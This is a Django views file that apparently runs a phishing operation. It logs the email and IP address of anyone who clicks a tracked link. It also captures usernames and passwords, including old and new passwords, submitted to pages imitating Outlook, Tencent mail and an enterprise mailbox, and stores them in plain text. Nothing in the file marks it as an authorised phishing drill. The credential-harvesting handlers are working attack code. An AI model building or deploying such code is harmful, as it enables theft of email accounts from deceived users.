from django.shortcuts import render, redirect

# Create your views here.
from .models import click, email_info


def click_rate(request):
    email = request.GET.get('email')
    print("点击邮箱：", email)
    try:
        ip = request.META['REMOTE_ADDR']
    except:
        ip = ""
    try:
        sql = click.objects.create(email=email, ip=ip)
    except Exception as e:
        print('添加点击率 %s add 失败' % email)
    return render(request, 'click.html')


def outlook_email(request):
    return render(request, 'outlook.html')


def outlook(request):
    email = request.POST.get('username')
    password = request.POST.get('oldPwd')
    new_password1 = request.POST.get('newPwd1')
    new_password2 = request.POST.get('newPwd2')
    try:
        sql = email_info.objects.create(email=email, password=password, new_password1=new_password1, new_password2=new_password2)
    except Exception as e:
        print('添加邮箱账号 %s 密码失败' % email)
    return redirect('http://127.0.0.1:8080/outlook_email')


def tengxun_email(request):
    return render(request, 'tengxun_email.html')


def tengxun(request):
    email = request.POST.get('username')
    password = request.POST.get('password')
    try:
        sql = email_info.objects.create(email=email, password=password)
    except Exception as e:
        print('添加邮箱账号 %s 密码失败' % email)
    return redirect('http://127.0.0.1:8080/tengxun_email')


def qiye_email(request):
    return render(request, 'qiye_email.html')


def qiye(request):
    email = request.POST.get('email')
    password = request.POST.get('password')
    try:
        sql = email_info.objects.create(email=email, password=password)
    except Exception as e:
        print('添加邮箱账号 %s 密码失败' % email)
    return redirect('http://127.0.0.1:8080/qiye_result')


def qiye_result(request):
    return render(request, 'qiye_result.html')
